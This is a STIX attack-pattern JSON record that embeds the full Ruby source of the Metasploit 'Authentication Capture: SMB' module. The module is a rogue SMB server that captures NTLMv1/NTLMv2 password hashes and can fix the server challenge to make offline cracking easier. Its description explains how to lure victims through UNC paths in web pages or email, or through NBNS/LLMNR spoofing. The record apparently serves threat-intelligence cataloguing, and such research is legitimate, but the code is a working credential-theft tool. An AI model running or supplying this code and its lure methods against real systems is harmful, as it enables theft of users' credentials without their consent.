{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d7cad99c-fcfe-44a4-8e66-0d0cc7a8e978",
    "created": "2024-08-14T16:22:00.816759Z",
    "modified": "2024-08-14T16:22:00.816763Z",
    "name": "Authentication Capture: SMB",
    "description": " This module provides a SMB service that can be used to capture the challenge-response password NTLMv1 & NTLMv2 hashes used with SMB1, SMB2, or SMB3 client systems. Responses sent by this service by default use a random 8 byte challenge string. A specific value (such as `1122334455667788`) can be set using the CHALLENGE option allowing for easy cracking using Cain & Abel (NTLMv1) or John the Ripper (with jumbo patch).  To exploit this, the target system must try to authenticate to this module. One way to force an SMB authentication attempt is by embedding a UNC path (\\\\\\\\SERVER\\\\SHARE) into a web page or email message. When the victim views the web page or email, their system will automatically connect to the server specified in the UNC share (the IP address of the system running this module) and attempt to authenticate. Another option is using auxiliary/spoof/{nbns,llmnr} to respond to queries for names the victim is already looking for.  Documentation of the above spoofing methods can be found by running `info -d`. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/server/capture/smb.rb",
            "external_id": "smb.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'ruby_smb'\nrequire 'ruby_smb/gss/provider/ntlm'\n\nclass MetasploitModule < Msf::Auxiliary\n  include ::Msf::Exploit::Remote::SMB::Server\n  include ::Msf::Exploit::Remote::SMB::Server::HashCapture\n\n  def initialize\n    super({\n      'Name' => 'Authentication Capture: SMB',\n      'Description' => %q{\n        This module provides a SMB service that can be used to capture the challenge-response\n        password NTLMv1 & NTLMv2 hashes used with SMB1, SMB2, or SMB3 client systems.\n        Responses sent by this service by default use a random 8 byte challenge string.\n        A specific value (such as `1122334455667788`) can be set using the CHALLENGE option,\n        allowing for easy cracking using Cain & Abel (NTLMv1) or John the Ripper\n        (with jumbo patch).\n\n        To exploit this, the target system must try to authenticate to this\n        module. One way to force an SMB authentication attempt is by embedding\n        a UNC path (\\\\\\\\SERVER\\\\SHARE) into a web page or email message. When\n        the victim views the web page or email, their system will\n        automatically connect to the server specified in the UNC share (the IP\n        address of the system running this module) and attempt to\n        authenticate. Another option is using auxiliary/spoof/{nbns,llmnr} to\n        respond to queries for names the victim is already looking for.\n\n        Documentation of the above spoofing methods can be found by running `info -d`.\n      },\n      'Author' => [\n        'hdm',                 # Author of original module\n        'Spencer McIntyre',    # Creator of RubySMB::Server\n        'agalway-r7',          # Port of existing module to use RubySMB::Server\n        'sjanusz-r7',          # Port of existing module to use RubySMB::Server\n      ],\n      'License' => MSF_LICENSE,\n      'Actions' => [[ 'Capture', { 'Description' => 'Run SMB capture server' } ]],\n      'PassiveActions' => [ 'Capture' ],\n      'DefaultAction' => 'Capture'\n    })\n\n    register_options(\n      [\n        OptString.new('CAINPWFILE', [ false, 'Name of file to store Cain&Abel hashes in. Only supports NTLMv1 hashes. Can be a path.', nil ]),\n        OptString.new('JOHNPWFILE', [ false, 'Name of file to store JohnTheRipper hashes in. Supports NTLMv1 and NTLMv2 hashes, each of which is stored in separate files. Can also be a path.', nil ]),\n        OptString.new('CHALLENGE', [ false, 'The 8 byte server challenge. Set values must be a valid 16 character hexadecimal pattern. If unset a valid random challenge is used.' ], regex: /^([a-fA-F0-9]{16})$/),\n        OptString.new('SMBDomain', [ true, 'The domain name used during SMB exchange.', 'WORKGROUP'], aliases: ['DOMAIN_NAME']),\n        OptAddress.new('SRVHOST', [ true, 'The local host to listen on.', '0.0.0.0' ]),\n        OptPort.new('SRVPORT', [ true, 'The local port to listen on.', 445 ]),\n        OptInt.new('TIMEOUT', [ true, 'Seconds that the server socket will wait for a response after the client has initiated communication.', 5])\n      ]\n    )\n\n    deregister_options('SMBServerIdleTimeout')\n  end\n\n  def start_service(opts = {})\n    ntlm_provider = HashCaptureNTLMProvider.new(\n      listener: self\n    )\n\n    # Set domain name for all future server responses\n    ntlm_provider.dns_domain = datastore['SMBDomain']\n    ntlm_provider.dns_hostname = datastore['SMBDomain']\n    ntlm_provider.netbios_domain = datastore['SMBDomain']\n    ntlm_provider.netbios_hostname = datastore['SMBDomain']\n    validate_smb_hash_capture_datastore(datastore, ntlm_provider)\n    opts[:gss_provider] = ntlm_provider\n\n    super(opts)\n  end\n\n  def on_client_connect(client)\n    print_good('Received SMB connection on Auth Capture Server!')\n  end\n\n  alias :run :exploit\nend\n"
}